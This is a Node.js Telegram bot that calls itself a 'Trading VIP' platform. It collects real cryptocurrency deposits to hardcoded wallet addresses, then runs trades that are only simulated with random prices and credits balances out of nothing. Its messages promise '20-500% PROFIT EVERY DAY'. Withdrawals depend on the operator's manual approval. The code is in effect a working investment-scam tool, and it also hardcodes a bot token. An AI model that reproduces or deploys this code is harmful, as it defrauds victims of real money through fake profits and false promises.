const TelegramBot = require('node-telegram-bot-api');
const mongoose = require('mongoose');
const crypto = require('crypto');
require('dotenv').config();

// Fixed Configuration Constants
const BOT_TOKEN = process.env.BOT_TOKEN || '8043337099:AAGliRe7sT3hpA0sf5TznqYW_esjQ7zLLII';
const ADMIN_IDS = (process.env.ADMIN_IDS || '7800907410,8045078245').split(',').map(Number);
const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/trading_bot';
const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME || 'VFToken_admin';

// Base crypto prices for simulation
const BASE_PRICES = {
    eth: 4375.47,
    btc: 133088.46,
    sol: 178.61
};

// Crypto symbols for display
const CRYPTO_SYMBOLS = {
    eth: '🔷 ETH',
    btc: '₿ BTC',
    sol: '◎ SOL'
};

// Wallet addresses for deposits
const WALLET_ADDRESSES = {
    eth: '0x78AE7e546d83ec239340467F5bcfe3551A460795',
    btc: 'bc1pjdjvncfe7jcsxylv60q079mkf5qhyshfxuthpw24y9hwpq9ymsuqn9ycpv',
    sol: 'DW91tG2b5ALyonvXBn4wGf311a8udfDcVbDhLJgoYypM'
};

// MongoDB Schema Definitions
const userSchema = new mongoose.Schema({
    userId: { type: Number, required: true, unique: true, index: true },
    username: { type: String, required: true },
    balance: {
        eth: { type: Number, default: 0.0, min: 0 },
        btc: { type: Number, default: 0.0, min: 0 },
        sol: { type: Number, default: 0.0, min: 0 }
    },
    createdAt: { type: Date, default: Date.now }
});

const depositSchema = new mongoose.Schema({
    userId: { type: Number, required: true, index: true },
    username: { type: String },
    cryptoType: { type: String, required: true, enum: ['eth', 'btc', 'sol'] },
    amount: { type: Number, required: true, min: 0 },
    walletAddress: { type: String, required: true },
    transactionHash: { type: String },
    transactionProofImage: { type: String },
    status: { type: String, default: 'pending', enum: ['pending', 'reviewing', 'approved', 'rejected'] },
    timestamp: { type: Date, default: Date.now },
    reviewedBy: { type: Number },
    reviewNote: { type: String }
});

const withdrawalSchema = new mongoose.Schema({
    userId: { type: Number, required: true, index: true },
    cryptoType: { type: String, required: true, enum: ['eth', 'btc', 'sol'] },
    amount: { type: Number, required: true, min: 0 },
    walletAddress: { type: String, required: true },
    status: { type: String, default: 'pending', enum: ['pending', 'approved', 'rejected'] },
    timestamp: { type: Date, default: Date.now }
});

const tradeSchema = new mongoose.Schema({
    userId: { type: Number, required: true, index: true },
    transactionHash: { type: String, required: true, unique: true },
    type: { type: String, required: true, enum: ['buy', 'sell'] },
    cryptoType: { type: String, required: true, enum: ['eth', 'btc', 'sol'] },
    amount: { type: Number, required: true },
    price: { type: Number, required: true },
    timestamp: { type: Date, default: Date.now }
});

// Initialize MongoDB Models
const User = mongoose.model('User', userSchema);
const Deposit = mongoose.model('Deposit', depositSchema);
const Withdrawal = mongoose.model('Withdrawal', withdrawalSchema);
const Trade = mongoose.model('Trade', tradeSchema);

// State management for automated trading
const automatedTradingSessions = new Map();

// Connect to MongoDB with retry logic
const connectWithRetry = async () => {
    try {
        await mongoose.connect(MONGO_URI);
        console.log('MongoDB connected successfully');
    } catch (err) {
        console.error('MongoDB connection error:', err);
        console.log('Retrying connection in 5 seconds...');
        setTimeout(connectWithRetry, 5000);
    }
};

connectWithRetry();

// Initialize Telegram Bot with polling
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// State management for user actions
const userStates = new Map();

// Helper Functions
const generateTransactionHash = () => crypto.randomBytes(32).toString('hex');

const ensureBalanceStructure = (balance) => {
    const defaultBalance = { eth: 0, btc: 0, sol: 0 };
    return { ...defaultBalance, ...balance };
};

const formatBalance = (balance) => {
    return Object.entries(balance)
        .map(([crypto, amount]) => {
            // Ensure amount is a number
            const validAmount = amount !== undefined && amount !== null ? amount : 0;
            return `${CRYPTO_SYMBOLS[crypto]}: ${validAmount.toFixed(8)}`;
        })
        .join('\n');
};

const simulateMarketPrice = (crypto) => {
    const basePrice = BASE_PRICES[crypto];
    const variation = (Math.random() * 0.1) - 0.05; // ±5% variation
    return basePrice * (1 + variation);
};

const showMenu = async (chatId) => {
    const options = {
        reply_markup: {
            keyboard: [
                ['💱 Trade', '💰 Balance'],
                ['📥 Deposit', '📤 Withdraw'],
                ['📊 Trade History', '👤 Profile'],
                ['❓ Help']
            ],
            resize_keyboard: true
        }
    };
    await bot.sendMessage(chatId, 'Trading 💎VIP💎 BOT Menu💸:', options);
};

// Handle Deposit
const handleDeposit = async (chatId, crypto) => {
    try {
        userStates.set(chatId, {
            action: 'awaiting_deposit_amount_usd',
            crypto: crypto
        });

        const message = `Please enter the amount in USD you want to deposit:`;
        const backButton = {
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back', callback_data: 'back_to_menu' }
                ]]
            }
        };
        await bot.sendMessage(chatId, message, backButton);
    } catch (error) {
        console.error('Deposit error:', error);
        await bot.sendMessage(chatId, "An error occurred processing your deposit request.");
    }
};

// Handle deposit approval/rejection
const handleDepositApproval = async (depositId, adminId, isApproved) => {
    try {
        const deposit = await Deposit.findById(depositId);
        if (!deposit) {
            await bot.sendMessage(adminId, "Deposit not found.");
            return;
        }

        if (isApproved) {
            deposit.status = 'approved';
            deposit.reviewedBy = adminId;
            await deposit.save();

            const user = await User.findOne({ userId: deposit.userId });
            if (user) {
                user.balance[deposit.cryptoType] += deposit.amount;
                await user.save();

                await bot.sendMessage(deposit.userId, `
✅ Deposit Approved!
Amount: ${deposit.amount} ${deposit.cryptoType.toUpperCase()}
Status: Completed

Your balance has been updated.`);
            }

            await bot.sendMessage(adminId, `Deposit ${depositId} has been approved and processed.`);
        } else {
            deposit.status = 'rejected';
            deposit.reviewedBy = adminId;
            await deposit.save();

            await bot.sendMessage(deposit.userId, `
❌ Deposit Rejected
Amount: ${deposit.amount} ${deposit.cryptoType.toUpperCase()}
Status: Rejected

Please contact support if you believe this is an error.`);

            await bot.sendMessage(adminId, `Deposit ${depositId} has been rejected.`);
        }
    } catch (error) {
        console.error('Deposit approval error:', error);
        await bot.sendMessage(adminId, "An error occurred while processing the deposit.");
    }
};

// Handle Withdrawal
const handleWithdrawal = async (userId, crypto, amount, walletAddress) => {
    try {
        const user = await User.findOne({ userId });
        if (!user) throw new Error('User not found');

        if (user.balance[crypto] < amount) {
            throw new Error('Insufficient balance');
        }

        const withdrawal = new Withdrawal({
            userId,
            cryptoType: crypto,
            amount,
            walletAddress
        });

        user.balance[crypto] -= amount;

        await Promise.all([
            withdrawal.save(),
            user.save()
        ]);

        const adminMessage = `
🔄 New Withdrawal Request

From: @${user.username} (ID: ${userId})
Amount: ${amount} ${crypto.toUpperCase()}
Wallet: ${walletAddress}

Please review and process this withdrawal.`;

        const adminOptions = {
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `approve_withdrawal_${withdrawal._id}` },
                    { text: '❌ Reject', callback_data: `reject_withdrawal_${withdrawal._id}` }
                ]]
            }
        };

        for (const adminId of ADMIN_IDS) {
            await bot.sendMessage(adminId, adminMessage, adminOptions);
        }

        return withdrawal;
    } catch (error) {
        throw error;
    }
};

// Handle withdrawal approval/rejection
const handleWithdrawalApproval = async (withdrawalId, adminId, isApproved) => {
    try {
        const withdrawal = await Withdrawal.findById(withdrawalId);
        if (!withdrawal) {
            await bot.sendMessage(adminId, "Withdrawal not found.");
            return;
        }

        if (isApproved) {
            withdrawal.status = 'approved';
            await withdrawal.save();

            await bot.sendMessage(withdrawal.userId, `
✅ Withdrawal Approved!
Amount: ${withdrawal.amount} ${withdrawal.cryptoType.toUpperCase()}
Wallet: ${withdrawal.walletAddress}
Status: Completed`);

            await bot.sendMessage(adminId, `Withdrawal ${withdrawalId} has been approved.`);
        } else {
            withdrawal.status = 'rejected';
            await withdrawal.save();

            // Refund the user's balance
            const user = await User.findOne({ userId: withdrawal.userId });
            if (user) {
                user.balance[withdrawal.cryptoType] += withdrawal.amount;
                await user.save();
            }

            await bot.sendMessage(withdrawal.userId, `
❌ Withdrawal Rejected
Amount: ${withdrawal.amount} ${withdrawal.cryptoType.toUpperCase()}
Status: Rejected

Your balance has been refunded. Please contact support if you need assistance.`);

            await bot.sendMessage(adminId, `Withdrawal ${withdrawalId} has been rejected.`);
        }
    } catch (error) {
        console.error('Withdrawal approval error:', error);
        await bot.sendMessage(adminId, "An error occurred while processing the withdrawal.");
    }
};

// Trading Functions
const executeTrade = async (userId, type, cryptoType, amount) => {
    const price = simulateMarketPrice(cryptoType);
    const transactionHash = generateTransactionHash();

    const trade = new Trade({
        userId,
        transactionHash,
        type,
        cryptoType,
        amount,
        price
    });

    const user = await User.findOne({ userId });
    if (!user) throw new Error('User not found');

    if (type === 'buy') {
        user.balance[cryptoType] += amount;
    } else {
        if (user.balance[cryptoType] < amount) {
            throw new Error('Insufficient balance');
        }
        user.balance[cryptoType] -= amount;
    }

    await Promise.all([
        trade.save(),
        user.save()
    ]);

    return { trade, price, transactionHash };
};

// Automated Trading Function
const startAutomatedTrading = async (userId) => {
    if (automatedTradingSessions.has(userId)) {
        return;
    }

    automatedTradingSessions.set(userId, {
        active: true,
        lastUpdate: Date.now()
    });

    const executeAutomatedTrades = async () => {
        try {
            const session = automatedTradingSessions.get(userId);
            if (!session || !session.active) {
                return;
            }

            const cryptos = ['eth', 'btc', 'sol'];
            const user = await User.findOne({ userId });

            for (const crypto of cryptos) {
                // Simulate market conditions
                const currentPrice = simulateMarketPrice(crypto);
                const tradeType = Math.random() > 0.5 ? 'buy' : 'sell';
                const amount = Math.random() * (tradeType === 'buy' ? 0.1 : 0.05);

                // Ensure the trade amount does not exceed the user's balance
                if (tradeType === 'sell' && user.balance[crypto] >= amount) {
                    await executeTrade(userId, tradeType, crypto, amount);
                } else if (tradeType === 'buy') {
                    await executeTrade(userId, tradeType, crypto, amount);
                }

                // Send update to user
                const update = `
🤖 Automated Trade Update
${CRYPTO_SYMBOLS[crypto]}
Type: ${tradeType.toUpperCase()}
Amount: ${amount.toFixed(8)}
Price: $${currentPrice.toFixed(2)}
`;
                await bot.sendMessage(userId, update);
            }

            // Calculate daily profit at end of day
            const now = new Date();
            if (now.getHours() === 23 && now.getMinutes() >= 55) {
                const trades = await Trade.find({
                    userId,
                    timestamp: { $gte: new Date().setHours(0, 0, 0, 0) }
                });

                const dailyProfit = trades.reduce((profit, trade) => {
                    return profit + (trade.type === 'sell' ? trade.amount * trade.price : -trade.amount * trade.price);
                }, 0);

                await bot.sendMessage(userId, `
📊 Daily Trading Summary
Total Trades: ${trades.length}
Net Profit: $${dailyProfit.toFixed(2)}
`);
            }
        } catch (error) {
            console.error('Automated trading error:', error);
        }
    };

    // Run trades every 5 minutes
    const interval = setInterval(executeAutomatedTrades, 5 * 60 * 1000);
    automatedTradingSessions.get(userId).interval = interval;
};

// Command Handlers
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    try {
        const user = await User.findOne({ userId: chatId });
        if (!user) {
            await new User({
                userId: chatId,
                username: msg.chat.username || 'Anonymous'
            }).save();
            await bot.sendMessage(chatId, 'Welcome to the Trading Simulator! Your account has been created.');
        } else {
            await bot.sendMessage(chatId, 'Welcome back to the Trading Simulator!');
        }
        await showMenu(chatId);
    } catch (error) {
        console.error('Start error:', error);
        await bot.sendMessage(chatId, 'An error occurred. Please try again.');
    }
});

// Callback Query Handler
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    try {
        if (data.startsWith('submit_deposit_')) {
            const crypto = data.split('_')[2];
            await handleDeposit(chatId, crypto);
        }
        else if (data.startsWith('confirm_deposit_')) {
            const userState = userStates.get(chatId);
            if (!userState || !userState.cryptoAmount) {
                await bot.sendMessage(chatId, 'Your deposit session has expired. Please start again.');
                userStates.delete(chatId);
                return;
            }

            userState.action = 'awaiting_transaction_hash';
            await bot.sendMessage(chatId, 'Please provide the transaction hash to verify your deposit:');
        }
        else if (data.startsWith('approve_deposit_')) {
            const depositId = data.split('_')[2];
            if (ADMIN_IDS.includes(chatId)) {
                await handleDepositApproval(depositId, chatId, true);
            }
        }
        else if (data.startsWith('reject_deposit_')) {
            const depositId = data.split('_')[2];
            if (ADMIN_IDS.includes(chatId)) {
                await handleDepositApproval(depositId, chatId, false);
            }
        }
        else if (data.startsWith('approve_withdrawal_')) {
            const withdrawalId = data.split('_')[2];
            if (ADMIN_IDS.includes(chatId)) {
                await handleWithdrawalApproval(withdrawalId, chatId, true);
            }
        }
        else if (data.startsWith('reject_withdrawal_')) {
            const withdrawalId = data.split('_')[2];
            if (ADMIN_IDS.includes(chatId)) {
                await handleWithdrawalApproval(withdrawalId, chatId, false);
            }
        }
        else if (data === 'start_automated_trading') {
            await startAutomatedTrading(chatId);
            await bot.sendMessage(chatId, `
🤖 Automated Trading Started🚀
Your account will now trade automatically.
You'll receive updates on each trade
📈📈📈20-500% PROFIT EVERY DAY📈📈📈
Daily profit summary will be sent at the end of each day.`);
        }
        else if (data.startsWith('withdraw_')) {
            const crypto = data.split('_')[1];
            userStates.set(chatId, {
                action: 'awaiting_withdrawal_amount',
                crypto: crypto
            });
            await bot.sendMessage(chatId, `Please enter the amount of ${crypto.toUpperCase()} you want to withdraw:`);
        }
        else if (data === 'back_to_menu') {
            await showMenu(chatId);
        }
    } catch (error) {
        console.error('Callback query error:', error);
        await bot.sendMessage(chatId, 'An error occurred processing your request.');
    }
});

// Message Handler
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    try {
        const userState = userStates.get(chatId);

        if (userState) {
            if (userState.action === 'awaiting_deposit_amount_usd') {
                const amountUSD = parseFloat(text);
                if (isNaN(amountUSD) || amountUSD <= 0) {
                    await bot.sendMessage(chatId, 'Please enter a valid amount in USD.');
                    return;
                }

                // Calculate crypto amount based on current price
                const cryptoPrice = simulateMarketPrice(userState.crypto);
                const cryptoAmount = amountUSD / cryptoPrice;

                // Store both USD and crypto amounts in state
                userState.amountUSD = amountUSD;
                userState.cryptoAmount = cryptoAmount;
                userState.action = 'awaiting_transaction_confirmation';

                // Show wallet address and instructions
                const message = `💰 Deposit Details

Amount: $${amountUSD.toFixed(2)} (${cryptoAmount.toFixed(8)} ${userState.crypto.toUpperCase()})

Please send exactly ${cryptoAmount.toFixed(8)} ${userState.crypto.toUpperCase()} to this address:
\`${WALLET_ADDRESSES[userState.crypto]}\`

⚠️ Important:
1. Only send ${userState.crypto.toUpperCase()} to this address
2. Send the exact amount to ensure proper tracking
3. Use the ${userState.crypto.toUpperCase()} network only

Once you've sent the funds, click the "I've Made the Deposit" button below.`;

                const confirmButton = {
                    reply_markup: {
                        inline_keyboard: [[
                            { text: "I've Made the Deposit", callback_data: `confirm_deposit_${userState.crypto}` },
                            { text: '🔙 Back', callback_data: 'back_to_menu' }
                        ]]
                    },
                    parse_mode: 'Markdown'
                };

                await bot.sendMessage(chatId, message, confirmButton);
            }
            else if (userState.action === 'awaiting_transaction_hash') {
                // Create new deposit record
                const deposit = new Deposit({
                    userId: chatId,
                    username: msg.from.username,
                    cryptoType: userState.crypto,
                    amount: userState.cryptoAmount,
                    walletAddress: WALLET_ADDRESSES[userState.crypto],
                    transactionHash: text
                });

                await deposit.save();

                // Notify admin
                const adminMessage = `
📥 New Deposit Request

From: @${msg.from.username} (ID: ${chatId})
Amount: ${userState.cryptoAmount} ${userState.crypto.toUpperCase()} ($${userState.amountUSD.toFixed(2)})
Transaction Hash: ${text}

Please verify and process this deposit.`;

                const adminOptions = {
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Approve', callback_data: `approve_deposit_${deposit._id}` },
                            { text: '❌ Reject', callback_data: `reject_deposit_${deposit._id}` }
                        ]]
                    }
                };

                for (const adminId of ADMIN_IDS) {
                    await bot.sendMessage(adminId, adminMessage, adminOptions);
                }

                await bot.sendMessage(chatId, `
✅ Deposit submission received!
Amount: ${userState.cryptoAmount} ${userState.crypto.toUpperCase()}
Status: Pending admin verification

You will be notified once your deposit is processed.`);

                userStates.delete(chatId);
            }
            else if (userState.action === 'awaiting_withdrawal_amount') {
                const amount = parseFloat(text);
                if (isNaN(amount) || amount <= 0) {
                    await bot.sendMessage(chatId, 'Please enter a valid amount.');
                    return;
                }

                const user = await User.findOne({ userId: chatId });
                if (!user) {
                    await bot.sendMessage(chatId, 'User not found.');
                    return;
                }

                if (user.balance[userState.crypto] < amount) {
                    await bot.sendMessage(chatId, 'Invalid amount. Amount exceeds your balance.');
                    return;
                }

                userState.action = 'awaiting_withdrawal_address';
                userState.amount = amount;
                await bot.sendMessage(chatId, `Please provide your ${userState.crypto.toUpperCase()} wallet address for withdrawal:`);
            }
            else if (userState.action === 'awaiting_withdrawal_address') {
                await handleWithdrawal(chatId, userState.crypto, userState.amount, text);
                await bot.sendMessage(chatId, `
Withdrawal request submitted!
Amount: ${userState.amount} ${userState.crypto.toUpperCase()}
Wallet: ${text}
Status: Pending admin approval

You will be notified once your withdrawal is processed.`);

                userStates.delete(chatId);
            }
        } else {
            switch (text) {
                case '💱 Trade':
                    const options = {
                        reply_markup: {
                            inline_keyboard: [[
                                { text: '🤖 Start Automated Trading', callback_data: 'start_automated_trading' }
                            ]]
                        }
                    };
                    await bot.sendMessage(chatId, 'Start automated trading system:', options);
                    break;

                case '💰 Balance':
                    const user = await User.findOne({ userId: chatId });
                    if (user) {
                        const balancedUser = ensureBalanceStructure(user.balance);
                        await bot.sendMessage(chatId, `Your current balance:\n${formatBalance(balancedUser)}`);
                    }
                    break;

                case '📥 Deposit':
                    const depositOptions = {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: 'ETH', callback_data: 'submit_deposit_eth' },
                                    { text: 'BTC', callback_data: 'submit_deposit_btc' },
                                    { text: 'SOL', callback_data: 'submit_deposit_sol' }
                                ],
                                [
                                    { text: '🔙 Back', callback_data: 'back_to_menu' }
                                ]
                            ]
                        }
                    };
                    await bot.sendMessage(chatId, 'Select cryptocurrency to deposit:', depositOptions);
                    break;

                case '📤 Withdraw':
                    const withdrawOptions = {
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: 'ETH', callback_data: 'withdraw_eth' },
                                    { text: 'BTC', callback_data: 'withdraw_btc' },
                                    { text: 'SOL', callback_data: 'withdraw_sol' }
                                ],
                                [
                                    { text: '🔙 Back', callback_data: 'back_to_menu' }
                                ]
                            ]
                        }
                    };
                    await bot.sendMessage(chatId, 'Select cryptocurrency to withdraw:', withdrawOptions);
                    break;

                case '📊 Trade History':
                    const trades = await Trade.find({ userId: chatId }).sort({ timestamp: -1 }).limit(10);
                    if (trades.length > 0) {
                        const history = trades.map(trade => `
${trade.type === 'buy' ? '🟢' : '🔴'} ${CRYPTO_SYMBOLS[trade.cryptoType]}
Amount: ${trade.amount.toFixed(8)}
Price: $${trade.price.toFixed(2)}
Date: ${trade.timestamp.toLocaleString()}`).join('\n\n');
                        await bot.sendMessage(chatId, `Recent Trades:\n${history}`);
                    } else {
                        await bot.sendMessage(chatId, 'No trade history found.');
                    }
                    break;

                case '👤 Profile':
                    const userProfile = await User.findOne({ userId: chatId });
                    if (userProfile) {
                        const balancedUser = ensureBalanceStructure(userProfile.balance);
                        await bot.sendMessage(chatId, `
👤 Profile Information
Username: @${userProfile.username}
Member since: ${userProfile.createdAt.toLocaleDateString()}
Balance:\n${formatBalance(balancedUser)}`);
                    }
                    break;

                case '❓ Help':
                    await bot.sendMessage(chatId, `
Need assistance? Contact @${SUPPORT_USERNAME}

Available commands:
/start - Start the bot
/trade - Start trading
/balance - Check your balance
/help - Show this help message

Use the menu buttons below for quick access to all features.`);
                    break;
            }
        }
    } catch (error) {
        console.error('Message handling error:', error);
        await bot.sendMessage(chatId, 'An error occurred processing your message.');
    }
});

// Error Handler
bot.on('error', (error) => {
    console.error('Telegram bot error:', error);
});

// Start the bot
console.log('Trading bot started...');
